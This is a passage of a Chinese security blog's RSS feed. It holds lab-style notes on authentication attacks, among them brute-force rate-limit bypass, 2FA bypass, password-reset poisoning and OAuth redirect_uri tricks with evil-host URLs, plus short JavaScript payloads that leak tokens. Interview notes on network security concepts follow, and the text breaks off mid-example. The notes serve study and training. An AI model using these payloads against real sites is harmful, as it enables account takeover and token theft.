&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;X-Forwarded-For 是用来识别通过 HTTP 代理或负载均衡方式连接到 Web 服务器的客户端最原始的 IP 地址的 HTTP 请求头字段。，用它伪装 IP 地址来绕过对暴力破解的限制。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;flawed-brute-force-protection&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#flawed-brute-force-protection&#34;&gt;#&lt;/a&gt; Flawed brute-force protection&lt;/h3&gt;
&lt;p&gt;常见的暴力破解防护措施有两种：如果一个账号有太多的登录失败尝试，就封锁账号；封掉发起太多失败登录的 ip。&lt;br /&gt;
对于锁定 ip，有的后端可能会在一个 ip 地址登陆成功后重置计时器，因此可以通过间歇登录成功账号来重置计时器。&lt;/p&gt;
&lt;h4 id=&#34;account-locking&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#account-locking&#34;&gt;#&lt;/a&gt; Account locking&lt;/h4&gt;
&lt;p&gt;发现一个账号在发起一定次数的错误登陆后会被锁定，找到这个次数，然后以不超过这个次数的频率进行爆破。&lt;/p&gt;
&lt;h4 id=&#34;user-rate-limiting&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#user-rate-limiting&#34;&gt;#&lt;/a&gt; User rate limiting&lt;/h4&gt;
&lt;p&gt;发现账号密码以如下的 json 表格进行传输。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;quot;username&amp;quot;:&amp;quot;123&amp;quot;,&amp;quot;password&amp;quot;:&amp;quot;123&amp;quot;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 将表格中的密码部分修改为数组形式，最后效果如下。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;quot;username&amp;quot; : &amp;quot;carlos&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;password&amp;quot; : [&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;123456&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;password&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;qwerty&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;]&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 发送请求，收到一个 302 的 response，选择讲此 response 在浏览器中显示，并讲 url 复制到浏览器中，成功登录账号。&lt;/p&gt;
&lt;h3 id=&#34;http-basic-authentication&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#http-basic-authentication&#34;&gt;#&lt;/a&gt; HTTP basic authentication&lt;/h3&gt;
&lt;p&gt;这种授权方式较少通过爆破绕过，可以试下 CSRF&lt;/p&gt;
&lt;h2 id=&#34;vulnerabilities-in-multi-factor-authentication&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#vulnerabilities-in-multi-factor-authentication&#34;&gt;#&lt;/a&gt; Vulnerabilities in multi-factor authentication&lt;/h2&gt;
&lt;h3 id=&#34;bypassing-two-factor-authentication&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bypassing-two-factor-authentication&#34;&gt;#&lt;/a&gt; Bypassing two-factor authentication&lt;/h3&gt;
&lt;p&gt;在有的 two-factor authentication 中，有的程序员由于疏忽，在第一次账户登录后就将用户标记为登录状态，而并非在第二次验证通过后才进行此操作，&lt;br /&gt;
因此我们可以在第一次账户登陆后，直接由 url 跳转到账户页面，从而绕过第二次验证。&lt;/p&gt;
&lt;h3 id=&#34;flawed-two-factor-verification-logic&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#flawed-two-factor-verification-logic&#34;&gt;#&lt;/a&gt; Flawed two-factor verification logic&lt;/h3&gt;
&lt;p&gt;在第二次验证时，由于使用 account 来判断进行验证的账号，因此可以先使用自己的账号密码登录，在第二次验证时修改协议中的 account 为目标账号，并对验证进行爆破。&lt;/p&gt;
&lt;h3 id=&#34;brute-forcing-2fa-verification-codes&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#brute-forcing-2fa-verification-codes&#34;&gt;#&lt;/a&gt; Brute-forcing 2FA verification codes&lt;/h3&gt;
&lt;p&gt;有的登录界面会在登陆时刷新验证码次数，所以可以使用 burp 脚本来重复登录 - 验证这一过程，达到爆破的目的。&lt;/p&gt;
&lt;h2 id=&#34;vulnerabilities-in-other-authentication-mechanisms&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#vulnerabilities-in-other-authentication-mechanisms&#34;&gt;#&lt;/a&gt; Vulnerabilities in other authentication mechanisms&lt;/h2&gt;
&lt;h3 id=&#34;keeping-users-logged-in&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#keeping-users-logged-in&#34;&gt;#&lt;/a&gt; Keeping users logged in&lt;/h3&gt;
&lt;p&gt;尝试下能否逆向 cookie 或窃取 cookie。&lt;/p&gt;
&lt;h3 id=&#34;resetting-user-passwords&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#resetting-user-passwords&#34;&gt;#&lt;/a&gt; Resetting user passwords&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;在请求修改密码的包中加入 x-forwarded-host 头指向自己的服务器，然后将账号信息设置为用户的信息，如果用户点击密码重置邮件的链接，其 token 就会转发到我们设置的服务器上去。&lt;/li&gt;
&lt;li&gt;爆破重置密码的包&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;oauth-20-authentication-vulnerabilities&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#oauth-20-authentication-vulnerabilities&#34;&gt;#&lt;/a&gt; OAuth 2.0 authentication vulnerabilities&lt;/h2&gt;
&lt;h3 id=&#34;vulnerabilities-in-the-client-application&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#vulnerabilities-in-the-client-application&#34;&gt;#&lt;/a&gt; Vulnerabilities in the client application&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;没有使用 state 绑定导致攻击者可以通过 CSRF 将自己的邮箱绑定别人的账号。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;vulnerabilities-in-the-oauth-service&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#vulnerabilities-in-the-oauth-service&#34;&gt;#&lt;/a&gt; Vulnerabilities in the OAuth service&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;使用 CSRF 获取他人 code，并用得到的 code 进行登录认证。&lt;br /&gt;
有的服务器会使用白名单来筛选 redirect_uri，可以尝试绕过。&lt;br /&gt;
针对黑名单，可以采取以下方法：a. 更换表述，比如用 2130706433, 017700000001, 或 127.1. 替换 127.0.0.1、b. 注册一个自己的域名来指向想要的 ip 地址、c。使用 URL 加密等技术混淆。&lt;br /&gt;
针对白名单匹配，可以采用以下方法：a. 使用 @符号在 hostname 前存放证书，比如 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9leHBlY3RlZC1ob3N0OmZha2VwYXNzd29yZEBldmlsLWhvc3Q=&#34;&gt;https://expected-host:fakepassword@evil-host&lt;/span&gt;、b. 使用 #符号来表示 URL 片段，比如 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ldmlsLWhvc3QjZXhwZWN0ZWQtaG9zdCVFMyU4MCU4MWM=&#34;&gt;https://evil-host#expected-host、c&lt;/span&gt;. 根据 DNS 命名规则将指定的输入存放在自己控制的 DNS 名中、d. 使用 URL 加密混淆。&lt;br /&gt;
有时还可以利用开放重定向漏洞配合目录穿越漏洞来实现网页跳转。&lt;br /&gt;
有时更改其他标志，比如将 response_mode 改为 fragment 有时也能绕过筛查。&lt;/li&gt;
&lt;li&gt;一段 payload&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if (!document.location.hash) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        window.location = &amp;#x27;URL&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; else &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        window.location = &amp;#x27;/?&amp;#x27;+document.location.hash.substr (1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
3.otherWindow.postMessage (message, targetOrigin, [transfer]);&lt;br /&gt;
message 是传递的内容，targetOrigin 是可接收的窗口。&lt;br /&gt;
以下脚本可以接收并传递传出来的信息。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    window.addEventListener (&amp;#x27;message&amp;#x27;, function (e) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        fetch (&amp;quot;/&amp;quot; + encodeURIComponent (e.data.data))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;, false)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
4.HTML injection vulnerabilities&lt;br /&gt;
 有的浏览器（比如火狐），在加载一些元素时（比如 &amp;lt; img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2V2aWwtdXNlci5uZXQ=&#34;&gt;evil-user.net&lt;/span&gt;&amp;quot;&amp;gt;），会将整个 URL 放在 refer 头里，包括一些我们关心的查询字符串。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;openid-connect&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#openid-connect&#34;&gt;#&lt;/a&gt; OpenID Connect&lt;/h2&gt;
&lt;p&gt;考虑到 OpenID 是建立在 OAuth 上，许多前面提到的 OAuth 存在的问题 OpenID 也存在，接下来介绍以下由 OpenID 带来的新问题。&lt;br /&gt;
1.Unprotected dynamic client registration&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://ericcd.com/2022/11/30/cybersecurity/hvv/</guid>
            <title>面经</title>
            <link>http://ericcd.com/2022/11/30/cybersecurity/hvv/</link>
            <category term="网络安全" scheme="http://ericcd.com/categories/cybersecurity/" />
            <pubDate>Wed, 30 Nov 2022 14:26:13 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;面经总结&lt;br /&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;个人知识扫盲&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#个人知识扫盲&#34;&gt;#&lt;/a&gt; 个人知识扫盲&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;waf&lt;br /&gt;
Web 应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web 应用防火墙是通过执行一系列针对 HTTP/HTTPS 的安全策略来专门为 Web 应用提供保护的一款产品。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ips&lt;br /&gt;
 入侵防御系统 (IPS: Intrusion Prevention System) 是电脑网络安全设施，是对防病毒软件（Antivirus Programs）和防火墙 (Packet Filter, Application Gateway) 的补充。 入侵防御系统 (Intrusion-prevention system) 是一部能够监视网络或网络设备的网络资料传输行为的计算机网络安全设备，能够及时的中断、调整或隔离一些不正常或是具有伤害性的网络资料传输行为，能够帮助组织识别恶意流量，并主动阻止此类流量进入其网络。。&lt;br /&gt;
IPS 一般也是在网络层旁路，可以理解为具备阻断能力的 IDS，是 IDS 的升级版（也有 IDS 检测到攻击通知阻断设备执行阻断动作的设备联动模式），可以覆盖网络层和应用层。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ids&lt;br /&gt;
IDS（intrusion detection system）入侵检测系统是一种对网络传输进行即时监视，在发现可疑传输时发出警报或者采取主动反应措施的网络安全设备。它与其他网络安全设备的不同之处便在于，IDS 是一种积极主动的安全防护技术。&lt;br /&gt;
IDS 工作在网络层，旁路部署，通过抓取和分析网络流量来发现攻击，主要关注网络层和传输层的数据包，如 IP、TCP、UDP 等协议。&lt;br /&gt;
产品：奇安信天眼&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;旁路部署&lt;br /&gt;
旁路部署是指安全设备在网络结构中处于旁路状态。在旁路模式下，安全设备只需要连接到交换机的指定镜像端口，所以形象的称之为 “旁路监控”；而串联模式一般是通过网关或者网桥的模式来进行监控，由于监控设备做了网关或者网桥，所以形象的称之为 “串联监控”。&lt;br /&gt;
旁路部署可以应用于防毒墙、IDS、上网行为审计、流控等很多安全设备。・&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;交换机&lt;br /&gt;
交换机工作在 OSI 模型的第二层，即数据链路层。 交换机的主要作用是连接多个以太网物理段，隔离冲突域，对以太网帧进行高速而透明的交换转发，自行学习和维护 MAC 地址信息。 希望这能帮到你。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;路由器&lt;br /&gt;
路由器属于 OSI 模型的第三层，即网络层。路由器的基本功能是把数据（IP 报文）传送到正确的网络，包括数据报的寻径和传送，子网隔离，抑制广播风暴，维护路由表，并与其它路由器交换路由信息，这是 IP 报文转发的基础，实现对 IP 数据报的过滤和记帐。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;交换机和路由器之间的关系&lt;br /&gt;
交换机负责连接网络设备（如交换机、路由器、防火墙、无线 AP 等）和终端设备（如计算机、服务器、摄像头、打印机等）；路由器实现局域网与局域网的互联，局域网与 Internet 的互联。&lt;br /&gt;
交换机不懂得 IP 地址，但它可以 “学习” MAC 地址，并把其存放在内部地址表中，通过在数据帧的始发者和目标接收者之间建立临时的交换路径，使数据帧直接由源地址到达目的地址。&lt;br /&gt;
普通的交换机一般工作在 OSI 七层模型的第二层 - 数据链路层，负责局域网之间的连接，而路由器工作在 OSI 的第三层 - 网络层，负责广域网之间的连接。&lt;br /&gt;
交换机都是根据 MAC 地址转发数据帧，而路由器是基于路由表转发数据包。&lt;br /&gt;
总而言之，交换机是将不同 IP 地址的电脑连在一起，共享一根网线；路由器是将同一个 IP 给不同的电脑使用，就像一条大路分成很多条小路。一句话，路由器是接外网的，交换机是接内网的。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;数据包从前端到后端的流程&lt;br /&gt;
客户端向服务器发起请求，请求会被封装成数据包。数据包会经过客户端的网卡，然后通过网线传输到路由器。路由器会根据目标 IP 地址，将数据包转发到下一个路由器或者直接转发到目标服务器。数据包到达目标服务器后，会被服务器的网卡接收。服务器会对数据包进行解析，然后根据请求内容进行处理。服务器处理完请求后，会将响应结果封装成数据包，然后通过网卡发送回客户端。数据包会经过路由器，然后通过网线传输到客户端的网卡。客户端的网卡接收到数据包后，会将数据包传递给操作系统内核。操作系统内核会对数据包进行解析，然后将响应结果交给应用程序。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;NAT&lt;br /&gt;
NAT 是指网络地址转换，是一种网络协议。当在专用网内部的一些主机本来已经分配到了本地 IP 地址（即仅在本专用网内使用的专用地址），但又想和因特网上的主机通信（并不需要加密）时，可使用 NAT 方法。这种方法需要在专用网（私网 IP）连接到因特网（公网 IP）的路由器上安装 NAT 软件。装有 NAT 软件的路由器叫做 NAT 路由器，它至少有一个有效的外部全球 IP 地址（公网 IP 地址）。这样，所有使用本地地址（私网 IP 地址）的主机在和外界通信时，都要在 NAT 路由器上将其本地地址转换成全球 IP 地址，才能和因特网连接。&lt;br /&gt;
NAT 的实现方式有三种，即静态转换 Static Nat、动态转换 Dynamic Nat 和端口多路复用 OverLoad&lt;br /&gt;
 静态转换是指将内部网络的私有 IP 地址转换为公有 IP 地址，IP 地址对是一对一的，是一成不变的，某个私有 IP 地址只转换为某个公有 IP 地址。借助于静态转换，可以实现外部网络对内部网络中某些特定设备（如服务器）的访问。&lt;br /&gt;
动态转换是指将内部网络的私有 IP 地址转换为公用 IP 地址时，IP 地址是不确定的，是随机的，所有被授权访问上 Internet 的私有 IP 地址可随机转换为任何指定的合法 IP 地址。也就是说，只要指定哪些内部地址可以进行转换，以及用哪些合法地址作为外部地址时，就可以进行动态转换。动态转换可以使用多个合法外部地址集。当 ISP 提供的合法 IP 地址略少于网络内部的计算机数量时。可以采用动态转换的方式。&lt;br /&gt;
端口多路复用（Port address Translation,PAT）是指改变外出数据包的源端口并进行端口转换，即端口地址转换（PAT，Port Address Translation）. 采用端口多路复用方式。内部网络的所有主机均可共享一个合法外部 IP 地址实现对 Internet 的访问，从而可以最大限度地节约 IP 地址资源。同时，又可隐藏网络内部的所有主机，有效避免来自 internet 的攻击。因此，网络中应用最多的就是端口多路复用方式。例如，假设有两个内部主机 A 和 B，它们都使用私有 IP 地址 192.  168.1.1 和 192.  168.1.2，并且它们都要访问外部网络。路由器使用公网 IP 地址 203.0.113.1，并且已经配置了 PAT。当主机 A 发送数据包到外部网络时，路由器会将源 IP 地址和源端口号转换为 203.0.113.1:10000，并将数据包发送到外部网络。当主机 B 发送数据包到外部网络时，路由器会将源 IP 地址和源端口号转换为 203.0.113.1:10001，并将数据包发送到外部网络。当外部网络返回数据包时，路由器会根据目标端口号将数据包转发到相应的内部主机。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;hids&lt;br /&gt;
HIDS（主机入侵检测系统）是一种监视计算机或网络中可疑活动的应用程序。监视的活动可以包括外部参与者创建的入侵，也可以包括内部资源或数据的滥用。HIDS 具有监视和分析计算系统内部方面以及其网络接口上的任何传入 / 传出网络数据包的能力。它通过监视操作系统操作、跟踪用户行为并在没有人类干预的情况下独立运行来检测主机上的恶意行为。&lt;br /&gt;
HIDS 则通过监测主机系统的系统日志、进程状态、文件变化等信息来检测安全事件，主要关注应用层和操作系统层的信息&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DOM 型 XSS 和反射型 XSS 的区别&lt;br /&gt;
 DOM 型 XSS 和反射型 XSS 的区别在于，DOM 型 XSS 不经过服务器，仅通过网页本身的 JavaScript 进行渲染触发，而反射型 XSS 是通过 URL 传递参数，服务器返回响应时，将参数中的恶意脚本代码反射回浏览器执行。DOM 型 XSS 的典型例子是在网页中插入一段恶意脚本代码，然后通过网页本身的 JavaScript 进行渲染触发。反射型 XSS 的典型例子是攻击者构造一个带有恶意脚本代码的 URL，然后将这个 URL 发送给受害者，当受害者点击这个 URL 时，恶意脚本代码就会被执行。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;内网 ip 和外网 ip 的区别&lt;br /&gt;
一般来说，10 开头的 IP 都是内网 IP，即 10.0.0.0 到 10.255.255.255 是内网 IP。而以下 IP 段的地址都是内网 IP 地址：172.  16.0.0 到 172.  31.255.255、192.  168.0.0 到 192.  168.255.255、169.254.x.x（其中 x.x 为任意数字）。如果您想判断一个 ip 是公网 IP 还是私网 ip，可以登录百度，搜索 IP 得到一个本机的外网 IP。然后打开路由器（确切的说是网关，网关可能是光猫也可能是路由器），然后登陆进入查看 WAN IP，这个是路由器连接上层网络的 IP。若 WAN IP 和百度查到的外网 IP 一致，那么这个就是公网 ip 了。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Kerboeros 协议&lt;br /&gt;
 Kerberos 协议是一种网络认证协议，用于在计算机网络上进行身份验证。它提供了一种安全的身份验证机制，以防止未经授权的访问。&lt;br /&gt;
Kerberos 协议的基本原理是：用户向 Kerberos 服务器请求一个票据，该票据用于向其他服务器证明用户的身份。Kerberos 服务器使用用户的密码来生成票据，并将其发送回用户。用户可以使用该票据来访问其他服务器，而无需再次输入密码。&lt;br /&gt;
通过过滤出 kerboros 流量，我们在 req-body 字段中，可以找到 clientName 的值，表示的就是 pc 的用户名，serverName 的两个字段一个表示服务用户名，一个是就是域名。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DHCP&lt;br /&gt;
DHCP 协议是一种网络协议，用于在 TCP/IP 网络上分配 IP 地址。DHCP 代表动态主机配置协议。DHCP 协议允许计算机在网络上自动获取 IP 地址，而无需手动配置。DHCP 还提供了其他信息，例如子网掩码、默认网关和 DNS 服务器的地址。DHCP 服务器是负责分配 IP 地址的服务器。DHCP 客户端是需要 IP 地址的计算机。可以帮助识别连接到网络的计算机的主机名、MAC 地址和 IP 地址。在 hostname 字段中可以找到主机名，在 clientMac 字段中可以找到主机的 mac 地址，这样我们就能把主机 - 主机 mac 地址 - IP 地址给关联起来，可以描述出网络中的主机拓扑结构。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;dict 协议&lt;br /&gt;
 Dict 协议是一个在线网络字典协议，这个协议是用来架设一个字典服务的。Dict 服务器和客户机使用 TCP 端口 2628。Dict 协议是基于查询响应的 TCP 协议，它的目标是超越 Webster protocol，并允许客户端在使用过程中访问更多字典 12.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;redis 服务&lt;br /&gt;
 Redis 是一个使用 ANSI C 编写的开源、包含多种数据结构、支持网络、基于内存、可选持久性的键值对存储数据库。它是一种 NoSQL 数据库，具有高性能、可扩展性强、高可用等优点，受到广泛开发人员和仓库管理人员的青睐。Redis 支持分布式，理论上可以无限扩展，是现在最受欢迎的 NoSQL 数据库之一。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;gopher 协议&lt;br /&gt;
 gopher 协议是一个古老且强大的协议，可以理解为是 http 协议的前身，他可以实现多个数据包整合发送。通过 gopher 协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;xml 文件&lt;br /&gt;
 XML 是一种用来传输和存储数据的可扩展标记语言。它由三部分组成：XML 文档声明，在文档的第一行；XML 文档类型定义，即 DTD，XXE 漏洞所在的地方；XML 文档元素。&lt;br /&gt;
XML 的 DTD 实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。&lt;br /&gt;
内部实体：&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!DOCTYPE test [&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!ENTITY writer &amp;quot;Bill Gates&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!ENTITY copyright &amp;quot;Copyright W3School.com.cn&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;]&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;外部实体：&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!DOCTYPE test [&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!ENTITY writer 